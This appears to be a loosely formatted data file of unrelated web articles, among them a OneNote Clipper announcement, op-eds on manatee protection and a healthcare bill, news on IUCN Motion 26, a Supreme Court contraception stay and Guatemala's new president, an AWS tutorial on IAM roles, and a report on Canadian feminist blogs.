  "latent_18250": "Today’s post was written by Avneesh Kohli, program manager on the OneNote team.\n\nToday, we’re introducing OneNote Clipper 2.0–a major update that offers enhancements for capturing web content into OneNote and enriching that content to make it more useful. The OneNote Clipper is the easiest way to save anything from the web to OneNote.\n\nResponding to some of the more popular requests from Clipper users, in this update we’ve added a redesigned user interface, a location picker, intelligence (for clipping just what you need, minus the clutter), and region clipping for Chrome.\n\nRedesigned user interface\n\nWe’ve designed a beautiful new experience for clipping pages to OneNote in your favorite web browser. It’s clean, takes up significantly less space in your window, and includes animations we think you’ll enjoy.\n\nLocation Picker\n\nBy far and away, the most popular request from Clipper users was to add more customized clipping location options. Previously, all clippings went to your Quick Notes section by default, however now you can select the notebook and section clippings get sent to.\n\nThe Location Picker is front and center in the new Clipper, so you can be confident in knowing that your web clips are going exactly where you want them to go. We provide a list of all notebooks you have stored on OneDrive, including shared notebooks!\n\nTo change where you want to store your web clipping, simply click the drop-down menu under Location. Expand the notebook of your choice and select the section you’d like to send your clip to. That’s it!\n\nOf course, having to select a location for each clipping can be a burdensome process. That’s why the OneNote Clipper remembers the last notebook and section you clipped to—perfect for when you are clipping lots of recipes, or collecting inspiration for a new art project.\n\nAnd because we include your shared notebooks in the Location Picker, it’s simple to share your clips with your friends and family. Just select the shared notebook of your choice, and it’s available to everyone you have given access to that notebook, instantly.\n\nA more intelligent Clipper for the most popular content\n\nPeople clip all kinds of things to OneNote, but articles, recipes and products top the charts. Unfortunately these sites often include clutter that gets in the way of the content you care about most. That’s why we built a more intelligent Clipper—able to automatically detect that the site you want to clip contains an article, recipe or product. For these web pages, the OneNote Clipper cleans up the page to show you only that content in a neat, organized format, and then shows you a preview.\n\nYou simply click the Article, Recipe or Product button on the right side of the Clipper, preview the article, recipe or product, and select Clip to send it to OneNote.\n\nHere’s a glimpse of what the intelligent Clipper can do:\n\nRegion clipping\n\nOften, you want to be able to capture a specific part of a web page, whether it’s a confirmation page or a new high score to your favorite web game.\n\nWe’ve now built in support for region clipping into our Chrome Extension. If you’ve got the OneNote Clipper Chrome Extension installed, just select Region mode from the Clipper user interface and then click and drag to select the area of the screen you’d like to clip.\n\nHere’s what it looks like:\n\nTo get started using Clipper, visit www.onenote.com/clipper.\n\nWe hope these updates make the Clipper more useful for you. If you have any additional ideas for how we can improve the Clipper, go to www.onenote.uservoice.com or leave a note in the comments below. We pay close attention to customer feedback and suggestions, so keep it coming.\n\nHappy clipping!\n\n—Avneesh Kohli",

  "latent_18258": "In response to a lawsuit by the Pacific Legal Foundation, the U.S. Fish and Wildlife Service (FWS) has decided downlisting manatees from endangered to threatened under the federal Endangered Species Act may be warranted, and the agency is embarking on a 5-year status review as part of the process\n\nLet me be very clear about the seriousness of the situation: from 2010-2013, 2,441 manatees died in Florida waters, which is 48 percent of the highest minimum population ever recorded (5,077 in 2010), but we’d have to wait until after 2015 to be able to include these data. However, ignoring this information would also constitute a substantial and unacceptable bias.\n\nReviews are important, but when they’re going to be tied to a decision that could alter the fate of a species, they need to contain the best and most updated data and information. Unfortunately for manatees, the data from the winters of 2010-2013 – including record mortality for the species, the worst ever recorded red tide that resulted in manatees being committed to mass graves in southwest Florida, and a new, mysterious cause of death that has not yet even been labeled in the Indian River Lagoon – won’t be in the mix because the most recent two years of data are left out of the models to avoid bias.\n\nA tool that is used during the review process is the Core Biological Model (CBM). In May 2013, the Manatee Forum, a group of 22 stakeholder organizations, received an update on this model as it related to the then-anticipated FWS status review. An appropriate sentiment on models was best stated by George Box, a British mathematician who said “... all models are wrong, but some are useful.” The devil is in the details with a model, and some of the details related to the CBM are not in the manatees’ favor.\n\nFirst, the group was told that the most current data only went through 2012 for the Atlantic and upper St. Johns River, 2010-2011 for Northwest Florida, and only through 2009-2010 for Southwest Florida. Data for survival rates only represent the years 2006-2008. We were also told that previous predictions for red tide estimated severe events in 15 percent of years, but the new model would dial that up to 35-45 percent of years, based on expert opinion.\n\nPossible changes in red tide frequency were incorporated into the model, but not changes in magnitude – an important limitation. (And let’s not ignore the significance of the fact that a panel of experts thinks we can expect the frequency of severe red tides to more than double!) The current model is also not able to “consider” changes in the frequency of cold weather events, although such changes are a likely component of climate change and would be a significant and repeat source of manatee deaths.\n\nIn general, the model doesn’t do much to consider changes to the natural system, although such changes are a stark reality for manatees and their habitat. The presenters discussed the fact that increases in population were projected for the upper St. Johns River and Northwest region where manatees use natural springs in the winter.\n\nYes, the springs are there, but there was no consideration of the fact that manatees primarily use protected springs, which are limited in number, and the size and capacity of these springs are being threatened by continually increasing human demands on the aquifer.\n\nManatee population growth in the Atlantic and Southwest, they said, has been driven by power plant capacity, which is expected to decline in about 20 years, and likely be eliminated altogether at some later date. Therefore, the agencies anticipate a significant shift in distribution away from coastal areas to springs.\n\nThere are two problems with this assumption:1) hundreds of manatees could stay put and freeze to death waiting for warm water at old power plant sites, and 2) as previously mentioned, the health of our springs is far from secure. In the model, watercraft mortality is predicted to continue at its current level, which is an unlikely scenario given the expected growth in Florida’s population in the years ahead, and the tendency to concentrate human population on our coasts.\n\nThe very next presentation at the meeting discussed the then-ongoing red tide event. The presenter explained that it was being called a repeat event, not an unusual mortality event, because red tide isn’t unusual anymore – it’s routine. This particular red tide set a new record for the agency, yielding 16 manatee carcasses in one day. (Remember how the model can’t consider the magnitude of red tide events? This is why that matters.)\n\nAs FWS embarks on its manatee status review, we must ensure that the agency considers all the facts and all of the potential threats to manatees and their habitat moving forward, not just what can be plugged into a model. It is going to take years to understand the implications of the unprecedented record mass mortality events of 2010-2013 on Florida’s manatee population, with regard to changes in reproduction, growth rate, and food abundance and distribution in the Indian River Lagoon.\n\nThese vitally important answers will come in time, but they won’t come by the time FWS will likely make an announcement on downlisting manatees nor will they be reflected in the Core Biological Model. Erring on the side of caution and acknowledging uncertainty is the prudent course for the agency, but time will tell whether integrity in our Fish and Wildlife Service is the most endangered species of all.\n\nKatie Tripp has been Save the Manatee Club’s Director of Science and Conservation since May of 2008.

  "latent_18292": "In a different political climate, the \"Patient Freedom Act\" introduced last month by Republican Senators Bill Cassidy and Susan Collins would be getting close scrutiny and perhaps some significant support. It is -- and I apologize for language that appears to have become profane in these polarized times -- a compromise. The bill recognizes that an outright repeal and replacement of Obamacare is going to be politically challenging for at least the next two years. It likewise recognizes that the persistence of Obamacare nationwide is likely to be challenging and expensive. It thus relies on the miracle of fiscal federalism: the federal government collects the money (or prints it) and gives it to states (kind of like expanded Medicaid) who can then choose to keep their Obamacare if they like. Alternatively, the states can receive about the same amount of money and use it to provide healthcare in different ways.\n\nARTICLE CONTINUES AFTER ADVERTISEMENT\n\nThe Cassidy-Collins Patient Freedom Act has several great virtues. First it is likely to make more people happy. It's just a mathematical fact that, if people's political views are correlated with the state they inhabit -- and they are -- decentralization of power leads to more people getting their way. To take a simple example, if the states are evenly divided on Obamacare and the population as a whole is evenly divided but the population of each state is divided 60-40, letting each state choose what they want makes about 10% more people happy. These days, that's pretty important.\n\nSecond, it allows for experimentation. The truth is we don't really know what works in healthcare. We've had one not particularly glorious experiment the past few years with Obamacare. Its detractors must admit that it has not (yet) completely collapsed and that it has helped some people receive useful healthcare. But its supporters must admit that it has failed to meet expectations: more expensive per person than anticipated, fewer people receiving coverage. (Cue up reflexive mutual blame by Republicans and Democrats here). And while we can point all we want to Canada or Britain or Singapore and assert that adoption of their system would be great, the truth is we don't know how well those systems work when they are inserted into a society with a different history, different medical traditions and a different culture.\n\nCassidy-Collins lets each state give it their best shot. Let's actually see what happens when the states can use federal dollars to provide healthcare to their people. It's not as if most state legislatures are greatly more dysfunctional than their monolithic counterpart in the District of Columbia. Probably some states will use the money poorly. Surely there will be people who would be better off under Obamacare than they will be under a state-fashioned alternative. But, also, I suspect there are many states that will use the money wisely. And there will definitely be people who will be considerably better off under the state alternative than they would if Obamacare insurance was unaffordable or the state's medical markets had been distorted beyond recognition as a result of the interplay of numerous federal policies.\n\nMore importantly, the Cassidy-Collins Patient Freedom Act would permit states to learn from each other and adapt in a way that is not possible under Obamacare and that is challenging under some of the other Republican alternatives. Maybe a Vermont single payor system really will work wonders without requiring massive tax hikes. Maybe a Texas approach based more on health savings accounts will result in smarter and cheaper healthcare without worsening health among the poor. To be sure, thanks to bad Supreme Court decisions like Shapiro v. Thompson, it's hard for one state to be particularly generous in provision of social benefits lest it become a nationwide magnet for the poor, but there are still enough impediments to interstate movement to allow for considerable state flexibility.\n\nThird, it is perhaps one of the few proposals that can actually be implemented before Obamacare collapses. Like it or not, the friendly environment in which Obamacare has limped on is about to disappear. The reinsurance subsidies for insurers have gone away. The IRS under President Trump has weakened the individual mandate by deliberately perpetuating what might have been seen as a bug in its enforcement: keeping it apparently optional whether to indicate on one's 1040 tax return whether one had qualifying health insurance coverage. Courts have (rightly) jeopardized further payments of the crucial cost sharing reduction payments to insurers. As a result of the \"instability\" (a/k/a complete dysfunctionality), insurers are already departing or threatening to depart for 2018 if market reforms are not made. And, at the moment, the probability that Republicans are really going to shore up Obamacare greatly while we wait for formation, enactment and implementation of their replacement, seems kind of slim. And, yes, I know the Trump administration has a rule pending that modifies special enrollment and does a few other things that will marginally increase the stability of Obamacare, but, as I have said elsewhere, that's a blue tarp over one hole on a roof with many leaks.\n\nThis is hardly to say that Cassidy Collins is perfect either in concept or in its details. As it stands, it's way, way too expensive. The Patient Freedom Act says that each state gets 95% of the amount that their residents would have received in Obamacare premium tax credits and (presumably funded) cost sharing reductions. Precisely because the ACA has increased premiums greatly over original projections, provision of premium tax credits and cost sharing reductions is costing the federal government a large sum of money. This expense persists even though enrollment on the ACA exchanges is far less than original projections. So paying 95% of a really large sum of money is still placing a heavy burden on the federal government, which seems unwilling to raise tax receipts or seriously reallocate funds from other federal programs. Moreover, right now the federal government saves tens of billions per year when states refuse to go along with expanded Medicaid. The Cassidy-Collins Patient Freedom Act ends that unequal treatment, but it does so in a very expensive way by giving non-expanding states basically the same amount of money as expanding states, 95% of what \"would have been received\" had the state expanded Medicaid. Given what we are seeing on the healthcare expenses of the population in expanded Medicaid, this equal treatment of the states could be a stunningly expensive component of the proposal.\n\nARTICLE CONTINUES AFTER ADVERTISEMENT\n\nThe \"would have received\" language in the bill also leaves too much open to interpretation that could easily lead to escalating federal obligations. There are lots of important questions. Will the formula just count people who actually enrolled in the state or will it count people who could have enrolled? How will the formula work in states that choose not continue with Obamacare? How will the formula work in states that have never expanded Medicaid? How do we know which people would have enrolled on the Exchanges or what their subsidy-determining financial situation would have been? To compute ACA subsidies, one also needs to know the cost of the second lowest premium in an area? How would we know in 2020 what the premiums would have been in, say, Texas, if Texas discontinued Obamacare in 2018? And how could one compute cost sharing reduction obligations, which requires knowledge of the premium charged by each insurer and the number of policies purchased from each insurer? How do we know how many people would have enrolled in expanded Medicaid if the state had gone along with it? Yes, a tight-fisted administration could likely answer these questions and interpret \"would have received\"language in such a manner that the overall bill did not escalate dramatically, but there is an equal risk that an administration eager to please constituents and willing to engage in yet more debt finance could interpret \"would have received\" in a way that was extremely costly.\n\nWe may already be looking at a $30 trillion gross federal debt amount in 2027, which will be 107% of projected GDP, a figure that would put the United States into the Italy-Portugal zone of fiscal recklessness. The Patient Freedom Act would be improved if the amount paid by the federal government was diminished well below 95% of the \"would-have-received\" amount, with states being free, if their own taxpayers oblige, to provide additional appropriations for additional benefits. The Patient Freedom Act would be further improved if a specific schedule were in place for its aggregate budget.\n\nMoreover, conceptually, the Patient Freedom Act is a bit strange. Instead of saying that states can use the money either for perpetuated Obamacare or for a plan featuring health savings accounts and high risk pools, why not just have the federal government give states the money and say that they can, within broad limits, do what they want with it in order to address healthcare? What if, for example, a state wanted to keep most of Obamacare but wanted to let insurers charge its oldest enrollees more than three times what it charges the youngest adults? What if a state wanted to keep many of the ideas of Obamacare but use a different income-based schedule to determine subsidies? If block grants are good enough for Medicaid, why are they not good enough for other forms of healthcare? And, of course, the Patient Freedom Act exemplifies the conceptual issues with \"fiscal federalism.\" If states want to provide generous healthcare, why not let them raise their own taxes and face clear accountability for their decisions rather than relying on a more elaborate system in which the federal government taxes and then gives some money back to the states. The Patient Freedom Act is not a bill any purist would devise.\n\nThe fact, however, that the Cassidy-Collins Patient Freedom Act needs considerable work and has some conceptual challenges is not a reason to be dismissive, however. If one can accept its basic framework of fiscal federalism coupled with tolerance of continued Obamacare -- at least for a while -- some hard work and realistic modeling should be able to improve the details. But details, I suspect, are not the reason the Patient Freedom Act has failed (until this article!) to gain a lot of traction. Right now, each side thinks -- or postures -- that it can \"win.\" And there is pain for everyone in Cassidy Collins. Liberals see fellow United States citizens in less enlightened states being denied the benefits of Obamacare. They feel a sense of great loss when a signature accomplishment of their beloved president become relegated to a deprecated option, among many, on how to keep people healthy. ACA despisers, particularly those in Red States, will see their tax money continue to go to what they regard as an expensive, freedom-infringing federal government system. They probably also have trouble with accepting that they control the Presidency and both houses of Congress and still can't come up with an idea that is ideologically more pure, politically palatable, and economically sound. Deficit hawks should be mortified at what it will all cost. I thus wonder if Cassidy-Collins might be everyone's second favorite bill. As it becomes clearer to more people, however, that neither side can score an outright \"win\" on healthcare this legislative session and that an unrepaired Obamacare is likely to shrivel beyond recognition in 2018 and beyond, the Patient Freedom Act remains useful as a healthcare bill in exile, one whose passage awaits the return of responsible realists to take charge of government.",

  "latent_18676": "ERIK HOFFNER OF ECOWATCH ON BUZZFLASH AT TRUTHOUT\n\n(Photo: EcoWatch)Article reprinted with permission from EcoWatch\n\nA first round of motions was passed Tuesday by the 1,300 government and civil society members of the International Union for the Conservation of Nature (IUCN) at its World Conservation Congress taking place in Hawaii. These include a ban on gillnet fishing in Mexico that threatens the vaquita porpoise and also restrictions on the illegal trade of pangolins.\n\nAmong the 85 motions like these that are up for a vote this week are some involving the direct and urgent needs of people too, including indigenous people whose sacred sites and lands face destructive forces. One need only look at the Dakota Access Pipeline battle here in the U.S., which would disturb sacred sites as well as water sources of the Standing Rock Sioux, to imagine that this sort of injustice happens to indigenous groups everywhere.\n\nThat's why many representatives from such groups are in Hawaii lobbying IUCN delegates to support Motion 26, which would declare their sacred natural sites to be \"no go zones\" for developers. As a resolution, it would be non-binding on governments, but would be one more tool for groups to use in pushing for policy changes at a local and national level. It is due for a vote by the delegates, probably on the last day of the Congress, which ends Sept. 10.\n\nNGOs have also lined up strongly in support of the motion (the progress of which can be followed on Twitter via the hashtags #Motion26 and #VoteForIUCNMotion26), including Women's Earth and Climate Action Network and also Amazon Watch, whose Andrew Miller, when asked why, said:\n\n\"Motion 26 reflects a call that indigenous peoples the world over have been making for decades. Colombia's U'wa kicked Occidental Petroleum out in 2002. In the Ecuadorian Amazon, Sarayaku similarly fought and beat Argentinian oil company CGC in the mid 2000s. Look at the inspiring No Dakota Access Pipeline actions happening right now. Indigenous peoples are going to vigorously defend their sacred territories from extraction whether or not Motion 26 passes. But adoption of the measure would blow wind into the sails of indigenous campaigns for territorial defense and would offer a tool to help strengthen national level protected area norms to include sacred natural sites.\"\n\nOne of the indigenous representatives here in Hawaii is Aura Tegria, a member of the U'wa in Colombia who acts as her group's legal advisor. She was a panelist for a high level discussion of these issues on Sept. 3 alongside other experts including the UN Special Rapporteur on the Rights of Indigenous Peoples, Victoria Tauli-Corpuz.\n\nThis was Ms. Tegria's powerful statement:\n\nThe U'wa Nation is found between five Colombian departments: Boyacá, Santander, Norte de Santander, Arauca and Casanare, along the eastern mountain range near the border with Venezuela.\n\nFrom our ancestral and cultural worldview, we maintain a relationship in harmony with our territory (called Kajka-Ika), who is conceived as our mother through ancestral wisdom. From her we human beings receive everything necessary to survive and to her we should reciprocate with respect and care. This is how the father creator—Sira (God) established the world, as a mandate written in the hearts of our wise Werjayas, for us to maintain the natural and spiritual balance.\n\nWithin the cosmovision U'wa, it is said that Mt. Zizuma (within the El Cocuy National Natural Park) is home to our existential beings, a site of knowledge that is in permanent communication with other indigenous peoples who have snow-capped mountains, a communication that is controlled by our traditional authorities, the Werjayas. The snow-capped peak is a biological, spiritual and natural corridor that guarantees human existence and permanence.\n\nOur sacred Mt. Zizuma is threatened by ecotourism, which brings serious consequences like contamination of our sources of freshwater, pollution of our sacred areas with solid waste trash, deforestation, cultural and spiritual impacts which break our relationship with our spiritual beings, disrespect and indignation within our People because of acts like the soccer game that was played up on Zizuma's peak.\n\nIt is also threatened by the presence of energy mining projects within U'wa territory, which accelerate climate change and violate our mandate to protect, take care of and safeguard our Mother Earth, carrying us toward a physical and cultural extermination as was expressed by the Colombian Constitutional Court in their Decision 004.\n\nOver the last 6 months our indigenous Nation alongside our Riowa (non-indigenous people) through the Masas Political Movement of Central-Eastern Colombia have carried out a Collective Nonviolent Action, exercising control of our territory through the U'wa Indigenous Guard and demanding respect for our sacred sites and compliance with agreements signed between the U'wa and national government in 2014, as the only guarantee for our ancestral people. This action ultimately led to the establishment of a Dialogue Table and new negotiations between the U'wa Nation and Colombian Government. As an indigenous nation we demanded that the National Parks Service as an environmental authority suspend eco-tourism in the El Cocuy Park and up on Mt. Zizuma while an impact study is carried out, which will allow the U'wa Nation to inform others as to our cosmovision and to offer elements that permit the true protection of Mt. Zizuma. However, this progress is currently being threatened by the recent declarations of Colombia's Environment Minister, who never participated in the negotiations but is now saying that El Cocuy will be reopened to tourism via presidential order. This would be a clear lack of compliance with the agreements by the Government and would run over the rights of our people. Faced with this, the U'wa Nation makes clear that we would continue in our peaceful grassroots mobilization.\n\nWe appreciate the fundamental role of international observation of the processes of dialogue with the Colombian State, such as the UN High Commissioner for Human Rights and their representative Todd Howland. Additionally, we appreciate the report of the Special Rapporteur for the Rights of Indigenous Peoples, Vicky Tauli-Corpuz, who has brought forth an issue that is currently very relevant, in which they included the issue of Mt. Zizuma. As the U'wa Nation, we say that it is necessary to coexist in harmony and balance with our Mother Earth and this only happens when we recognize and respect the existence of all beings, both material and spiritual.\n\nI would underscore the recommendations of the Special Rapporteur to the governments, such as guaranteeing the recognition and respect for ancestral knowledge. In the case of the Colombian government, they should guarantee full participation for indigenous peoples and adopt all normative, judicial and administrative norms necessary to recognize our rights over our ancestral territories and indigenous reserves.\n\nThrough autonomous spaces amongst indigenous peoples in Colombia, we have analyzed our concerns around the imposition of protected areas within our territories, ignoring the spiritual significance of such. Responding to this dynamic, we would like to offer some additional elements:\n\n1. Recognize that prior to the establishment of protected areas, we have our spiritual relationship with our sacred areas, as guardians and protectors of these lands because this is our mandate handed down from our Original Law, the law of Sira, which is immutable.\n\n2. Recognize that from time immemorial we have conserved our territories through our traditional uses and customs, maintaining the harmony between the spiritual and material worlds. In the Colombian case the government still has not recognized this fundamental role of our indigenous traditional authorities as legitimate environmental authorities.\n\nFollow the progress of Motion 26 on Twitter via the hashtags #Motion26 or #VoteForIUCNMotion26.",

Programmatic access to AWS services requires an Access Key and Secret Key. Your keys might look something like this (use this guide to create your own keys):\n\naws_access_key_id = ARTDOSFODNN7EXAMPLE aws_secret_access_key = wJalrXUtnTRSMI/K756ENG/bPxRfiCYEXAMPLEKEY\n\nYou could hard code your access keys in your application to enable access to AWS services like S3 or DynamoDB, but anyone with access to the code will be able to see the keys in plain text. If your server gets hacked, imagine the consequences of having left code like this lying around:\n\nInstead of the above code, you can completely avoid this vulnerability by using an IAM role, which lets you securely distribute keys to your users and applications. IAM role credentials can (and should) be rotated regularly and temporary credentials provided for service access. If your application needs to access objects in an s3 bucket, temporary security credentials are provided to the host ec2 instance. IAM roles for EC2 instances also work within Amazon Virtual Private Clouds:\n\nBenefits:\n\nNo need to share permanent security credentials.\n\nUses temporary security credentials when making requests from running EC2 instance. Effective Amazon security requires the use of AWS IAM with temporary authentication credentials: we’ll explore implementation via the command line and SDKs to AWS services.\n\nIntegrated with All AWS Software Development Kits (SDKs) and the command line interface tool (CLI).\n\nCreating an AWS IAM role\n\nLog into the IAM console. Click on Roles on the left panel , and then click Create New Role. Specify a descriptive Role name . Select Role Type as EC2.\n\nOn the Attach Policy page, you can either select an existing policy, or go back and create a new policy as per your needs. Review the role information, and then click Create Role. You can launch an instance using either a CLI or the Console: in Ec2 dashboard, click Launch Instance. Select your AMI, then select an instance type and click Next: Configure Instance Details . On the Configure Instance Details page, Specify the role when you launch your instances. Once this is done, your application will retrieve a set of temporary credentials and use them in your application.\n\nUsing AWS IAM Roles with the command line interface\n\nHere’s a simple script to launch an instance using the AWS CLI. As you can see for yourself, we have included no AWS Keys. The “/etc/profile.d/aws-apitools-common.sh” file provides all the authentication you’ll need at run time (note, that if you’re running an AMI besides Amazon Linux, you may need to install this file manually).\n\n#!/bin/bash . /etc/profile.d/aws-apitools-common.sh aws ec2 run-instances --image-id ami-1ecae776 --region us-east-1 --placement AvailabilityZone=us-east-1b --instance-type t2.large --key-name demo-key --subnet-id subnet-45874145 --security-group-ids sg-1254854\n\nUsing AWS IAM Roles with the PHP SDK\n\nWhen using an IAM role with a PHP application, you can create caching layers on top of your IAM role credentials to specify a credentials cache using the credentials.cache o ption in a client’s factory method, or in a service builder configuration file. The configuration setting (credentials.cache) should be configured to an object that implements Guzzle’s CacheAdapterInterface . A credential’s cache can also be used in a service builder configuration.\n\n<?php // File saved as /path/to/custom/config.php use Doctrine\\Common\\Cache\\FilesystemCache; use Guzzle\\Cache\\DoctrineCacheAdapter; $cacheAdapter = new DoctrineCacheAdapter(new FilesystemCache('/tmp/cache')); return array( 'includes' => array('_aws'), 'services' => array( 'default_settings' => array( 'params' => array( 'credentials.cache' => $cacheAdapter ) ) ) );\n\nUsing AWS IAM Roles with the Java SDK\n\nIn order to use the AWS java SDK to connect AWS IAM service, all dependent Packages related to AWS IAM and AWS credentials need to be specified in the build path. The Java SDK uses “Class InstanceProfileCredentialsProvider” that loads credentials from the Amazon EC2 Instance Metadata Service, which retrieves temporary AWS credentials that have the same permissions as the IAM role associated with our EC2 instance. At the start of your program, you need import the “com.amazonaws.auth.*” class.\n\nimport com.amazonaws.auth.profile.ProfileCredentialsProvider;\n\nUsing AWS IAM Roles with the Ruby SDK\n\nIn the Ruby SDK, EC2Provider objects retrieve credentials with the same permissions as the IAM role. These credentials refresh regularly to get access to the AWS services.\n\nAWS.config(:credential_provider => AWS::Core::CredentialProviders::EC2Provider.new)\n\nHere’s a sample program that will download an object from AWS S3. As you can see, we have used no credentials within the code.\n\nrequire 'rubygems' require 'aws-sdk' s3 = AWS::S3.newaws-iam-instance bucket_name = 'text-content' obj_name = 'text-object.txt' document = s3.buckets[bucket_name].objects[obj_name] File.open(obj_name, \"w\") do |f| f.write(document.read) end puts \"'#{obj_name}' copied from S3.\"",

  "latent_19234": "5 years ago\n\nUpdated 2:51 p.m. ET, 1/1/2014\n\n(CNN) - The Supreme Court has temporarily delayed key requirements of the Affordable Care Act impacting religious-affiliated groups, accelerating another high-stakes legal test for the sweeping law championed by President Barack Obama.\n\nIn a surprising twist just hours before the start of the New Year when most major rules of Obamacare were set to take effect, Justice Sonia Sotomayor exempted two Catholic Church-affiliated nonprofits from having to provide contraceptive coverage to employees of face fines for non-compliance.\n\nThe Little Sisters of the Poor, a charity congregation of Roman Catholics in Denver, and the Illinois-based Christian Brothers Services, objected on moral and religious grounds and were excused from having to comply until Friday at least.\n\nSotomayor set that date as the deadline for the federal government to file a legal response.\n\nThe White House on Wednesday expressed support for the measure.\n\nThe justice's action was narrowly applied but it could ultimately impact dozens of religious groups and businesses that have mounted legal challenges in recent months, depending on how the court ultimately handles the matter.\n\nThe contraception issue has been a major sticking point in the law, Obama's signature diplomatic achievement, that overall has been the subject of enormous legal and political controversy.\n\nAlthough enacted in 2010, key requirements of the Affordable Care Act are just now kicking into gear following years of fierce political and other turmoil that included a Supreme Court ruling that found it constitutional and a flawed rollout of its online enrollment process this past fall.\n\nCongressional Republicans and others who bitterly oppose Obamacare call it government overreach, a burden on business and the economy, and a regulatory disaster. Repeated attempts to overturn it have failed yet Republicans continue to press the issue in the courts and on the campaign trail.\n\nThe church and state issue now in the spotlight involves rules negotiated last year between the Obama administration and various outside groups.\n\nUnder the law, churches and houses of worships are exempt from the contraception mandate.\n\nBut other nonprofit religious-affiliated groups, such as church-run hospitals, parochial schools and charities like the Little Sisters of the Poor, must either provide no-cost contraception coverage or have a third-party insurer provide separate benefits without the employer's direct involvement.\n\nA White House official on Wednesday said the Obama administration was confident the rules \"strike the balance of providing women with free contraceptive coverage while preventing non-profit religious organizations with religious objections to contraceptive coverage from having to contract, arrange, pay, or refer for such coverage.\"\n\nThe matter handled by Sotomayor was separate from other emergency appeals filed on Tuesday by Catholic archdioceses in Michigan, Tennessee and Washington, D.C. They were not acted on because lower courts had already issued injunctions temporarily blocking enforcement.\n\nThese organizations are all seeking delays around the employer-contraception requirement, saying in their court filing it would force them \"to choose between onerous penalties or becoming complicit in a grave moral wrong.\"\n\nMoreover, the president of the U.S. Conference of Catholic Bishops, Archbishop Joseph Kurtz of Louisville, pressed Obama directly on the issue.\n\nHe asked him in a letter to delay the mandates impacting religious groups and some businesses.\n\nKurtz pointed to other delays the administration has made, such as putting off until 2015 the requirement for all employers with more than 50 workers to provide health coverage.\n\nThe Supreme Court agreed last month to hear two cases involving for-profit corporations that contend their religious liberty is violated by the law.\n\nThe White House said in November that it believes a requirement on contraceptives is \"lawful and essential to women's health.\"\n\n- CNN's Eric Marrapodi, Jim Acosta, and Ashley Killough contributed to this report.",

  "latent_19558": "By Latinamerica Press\n\nOn Jan.14, Guatemala inaugurated a new president who will govern until 2020. Jimmy Morales, 46, swore to uphold the law and to govern as president with “patriotic love.” That same day, the Congress that was newly elected on September 6 also took office.\n\nMorales, from the National Convergence Front (FCN), won the runoff election in Oct. 25 with 67 percent of the vote, while Sandra Torres, from the National Unity of Hope (UNE), received 33 percent of votes. Morales’s victory is seen as a vote of protest against widespread corruption in the country, which forced the resignation of former president Otto Perez Molina (2012-2015) on Sept. 2. Perez Molina is currently imprisoned.\n\n“Thank you God for the privilege you have given me to serve my people,” were Morales’s first words after swearing in to office. He is a conservative and deeply religious comedian. “There is no magic. Let’s stop resigning ourselves to pessimism. A new Guatemala is possible and worthwhile.”\n\nMorales emphasized that he will attack, with the support of the citizens, corruption and poverty — which affects nearly 60 percent of the 16.7 million people in Guatemala — as well as improve health services and education, among other policies.\n\n“I am sure that we do not want to wake up to see the dinosaur of corruption, nor the traditional way of doing politics, or the feuds of those who make a living by dividing us Guatemalans,” added the president.\n\nIn a hearing with Morales the day after his inauguration, the Executive Secretary of the United Nations Economic Commission for Latin America and the Caribbean (ECLAC), Alicia Bárcena, suggested spearheading “a new model of economic development that promotes social inclusion and helps fight poverty.”\n\n“This model must be based on a policy of productive transformation with technological innovation and competitiveness to create decent and quality employment, as well as on a budgetary scheme that is more flexible and allows the country to increase its tax revenue, which in 2013 represented 13 percent of Gross Domestic Product (GDP), compared with an average of 21.3 percent in Latin America and the Caribbean as a whole,” said Bárcena.\n\nTo do this, Guatemala “should boost its domestic regional development, reducing the costs of logistics, security, electricity and the Internet, while also adopting a foreign policy that integrates the areas of trade, investment, culture and politics and that reassumes leadership in regional integration processes,” she added.\n\nECLAC calculates that Guatemala ended 2015 with growth of 3.9 percent and estimates that this pace will hold steady in 2016, when the expansion is forecast at 4 percent.\n\nMajority opposition in Congress\n\nAmong the challenges Morales will face is a majority opposition in Congress, chaired by Mario Taracena Díaz Sol, of the UNE. Of the 158 representatives, the Renewed Democratic Liberty party (LIDER) — whose leader Manuel Baldizón was the favorite to win the elections but ended in third place — has the largest number of legislators (45), followed by UNE (33) and the Patriotic Party (18) of Pérez Molina. The FCN has only 11 representatives, which will force the president to negotiate with the different political forces to adopt legislative initiatives.\n\nHuman rights will also be an important issue that the new government will have to address. On Jan. 6, 13 military officers were accused of forced disappearances and other crimes against humanity. Among the accused are retired General Benedicto Lucas García, former chief of staff during the regime of his brother, the former dictator Romeo Lucas García (1978-1982), and retired Lieutenant Colonel César Augusto Cabrera Mejía, whom Morales intended to appoint Minister of Interior. According to the Public Ministry, the officers are responsible for the disappearance and death of at least 558 indigenous people in the 80s.\n\nAdditionally, on Jan. 11 the trial of former dictator Efraín Rios Montt, 89, was suspended. Montt is accused of genocide during his rule between 1982 and 1983, a time considered the bloodiest in the 36 years of armed conflict. This period ended with the signing of the peace agreements in 1996 and left more than 200,000 dead and disappeared. The court decided to suspend the trial until three writs of amparo filed by Rios Montt’s defense are resolved.\n\nWhile some sectors were concerned about the presence of businessmen in the new cabinet, the head of the International Commission Against Impunity in Guatemala (CICIG), Iván Velásquez, confirmed that the cabinet members Morales appointed were analyzed by the committee, finding no inconsistencies regarding their integrity.\n\n“President Morales asked us to review whether there was any information about some people he hoped to appoint to his government,” Velásquez said. “We worked exclusively on that, and there were no active role or suggestions of the candidates for the positions. We expressed what we knew about the people that the President submitted for consideration, and we did so with the full confidence and confidentiality as appropriate in matters of this nature.”",

In addition to an in-depth discussion around statistics gathered, the report contains a detailed catalogue of 108 blogs, an exciting new resource for bloggers and anyone interested in exploring the Canadian feminist blogosphere.\n\nInterestingly, the very definition of a ‘feminist blog’ had to be revised during the course of the project, as a significant portion of blogs included in the study – 38 per cent – were written by authors who did not identify as feminist, yet blogged about feminist issues. As a result, the scope of the project and catalogue was shifted to refer to “blogs of feminist interest.”\n\nBeyond a breakdown of which bloggers identify as feminist and which do not, the research released by WAM! Vancouver this week also reveals interesting trends. According to the report, the largest proportion of active blogs was authored by bloggers who did not identify as feminist (73 per cent of blogs in this category were deemed to be active). Whereas, only 43 per cent of the blogs authored by persons who identified explicitly as feminist were active during the research period.\n\nSimilar patterns were noted amongst blogs authored by multiple contributors, compared to just one writer. Blogs authored by multiple contributors were found to be significantly more likely to remain active than blogs managed by one person (42 per cent compared to 18 per cent).\n\nCoulson, the report’s author, suggests this may be a result of burnout on the part of feminist-identified bloggers, especially those blogging alone, who seemed to expend a great deal of energy managing blog trolling and derailing within comment threads. She suggests this is likely more common on feminist blogs than less 